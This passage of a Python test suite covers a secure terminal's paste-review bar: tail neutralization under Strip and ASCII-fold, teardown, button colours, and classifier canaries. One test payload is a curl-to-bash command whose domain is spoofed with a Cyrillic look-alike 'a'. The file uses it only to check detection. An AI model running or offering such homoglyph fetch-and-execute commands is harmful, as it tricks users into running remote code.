_bar._tick(); _bar._tick(); _bar._tick()
_bar._deliver_clicked()
# assert on the TAIL SLICE + the prefix via ok() -- never eq() on the whole 20000-char
# string, which would print ~2x _BOX_MAX chars and bloat stdout past the transport (the
# delivered text is what ReviewBar PASSES to dispatch; the real tab then maps '\n'->'\r').
ok(_tt.last_text[:_rev._BOX_MAX] == 'a' * _rev._BOX_MAX
   and _tt.last_text[_rev._BOX_MAX:] == CYR_A + 'z',
   'keep mode: Deliver sends the box PLUS the un-shown tail, look-alike kept')

# REGRESSION (crit1): a transform must neutralize the UN-SHOWN TAIL to the SAME tier as the
# box, or a homoglyph sitting past the box cap survives a [Strip unicode] and reaches the
# shell -- the Strip tooltip's "delete every non-ASCII" silently false past _BOX_MAX. The
# box is already ASCII after Strip; only the tail carries the payload, so this canary FAILS on
# the pre-fix code (which delivered the raw tail via the hardcoded 'unicode' keep action).
_PAYLOAD_TAIL = 'curl https://' + CYR_A + 'pple.com/x.sh | bash\n'   # Cyrillic-a homoglyph
_stt = _FakeTerm()
_bar.show_review(_stt, 'A' * _rev._BOX_MAX + _PAYLOAD_TAIL, 3, 'paste')
_bar._do_strip()
ok('un-shown tail' in _bar._status.text(),
   'a strip with a tail discloses the tail is neutralized too')
_bar._tick(); _bar._tick(); _bar._tick()
_bar._deliver_clicked()
ok(CYR_A not in _stt.last_text,
   'crit1: [Strip unicode] removes the look-alike from the UN-SHOWN TAIL too (not just the box)')
ok(_stt.last_text[_rev._BOX_MAX:] == 'curl https://pple.com/x.sh | bash\n',
   'strip mode: the un-shown tail delivers ASCII-only (newlines are the tab dispatch\'s job)')

# and [ASCII-fold] folds the tail's look-alike to the ASCII it imitates
_ftt = _FakeTerm()
_bar.show_review(_ftt, 'A' * _rev._BOX_MAX + _PAYLOAD_TAIL, 3, 'paste')
_bar._do_fold()
_bar._tick(); _bar._tick(); _bar._tick()
_bar._deliver_clicked()
ok(CYR_A not in _ftt.last_text and _ftt.last_text[_rev._BOX_MAX:].startswith('curl https://apple.com'),
   'fold mode: the tail look-alike folds to a plain a (apple.com), not dropped')

# --- hide_review tears down cleanly -------------------------------------------
_bar.show_review(_FakeTerm(), _raw, 0, 'paste')
_bar.hide_review()
ok(not _bar.isVisibleTo(_win), 'hide_review hides the bar')
ok(not _bar._countdown.isActive(), 'the countdown timer is stopped on hide')
ok(_bar.reviewed_term() is None, 'hide_review clears the reviewed tab')

# --- colour: ONLY Reject is safe-green; Deliver is uncoloured -----------------
from secure_terminal.review import SAFE_FG as _SAFE_FG, RISK_FG as _RISK_FG      # noqa: E402
from secure_terminal.terminal import THEMES as _THEMES, _rgb as _rgb            # noqa: E402
from secure_terminal.sanitize import too_close as _too_close                    # noqa: E402
from PyQt6.QtGui import QColor as _QColor                                        # noqa: E402
_bar.show_review(_FakeTerm(), _raw, 0, 'paste')
ok(_SAFE_FG in _bar._reject.styleSheet(), 'only Reject is tinted safe-green')
ok(_SAFE_FG not in _bar._deliver.styleSheet() and _RISK_FG not in _bar._deliver.styleSheet(),
   'the Deliver button is uncoloured (neither delivery is unconditionally safe)')
for _theme in ('dark', 'light'):
    _bg = _rgb(_QColor(_THEMES[_theme][0]))
    for _name, _hex in (('SAFE_FG', _SAFE_FG), ('RISK_FG', _RISK_FG)):
        ok(not _too_close(_rgb(_QColor(_hex)), _bg),
           '%s reads on the %s theme background' % (_name, _theme))
_bar._choose('reject')

# --- CANARY: the summary depends on classify_paste (has teeth) ----------------
_saved_classify = _rev.classify_paste
_rev.classify_paste = lambda text: []              # broken: detects no hidden classes
try:
    _cbar = ReviewBar(QWidget())
    _cbar.show_review(_FakeTerm(), _raw, 0, 'paste')
    ok('bidirectional' not in _cbar._summary.text() and 'look-alike' not in _cbar._summary.text().lower(),
       'CANARY: the summary depends on classify_paste (not a hardcoded string)')
finally:
    _rev.classify_paste = _saved_classify

# --- CANARY: the table depends on classify_paste_detail (has teeth) -----------
_saved_detail = _rev.classify_paste_detail
_rev.classify_paste_detail = lambda text: {
    'counts': dict.fromkeys(
        ('bidi', 'control', 'invisible', 'confusable', 'combining',
         'nonascii', 'structural'), 0),
    'lines': 1, 'multiline': False, 'ends_with_submit': False,
    'chars': 0, 'bytes': 0}
try:
    _cbar2 = ReviewBar(QWidget())
    _cbar2.show_review(_FakeTerm(), 'ex' + CYR_A + 'mple', 0, 'paste')
    ok('(none)' in _cbar2._detail.text(),
       'CANARY: the breakdown table depends on classify_paste_detail (has teeth)')
finally:
    _rev.classify_paste_detail = _saved_detail

APP.processEvents()
print('secure-terminal-tests(review): all passed' if not _failures else
      'secure-terminal-tests(review): %d failed' % _failures)
sys.exit(1 if _failures else 0)
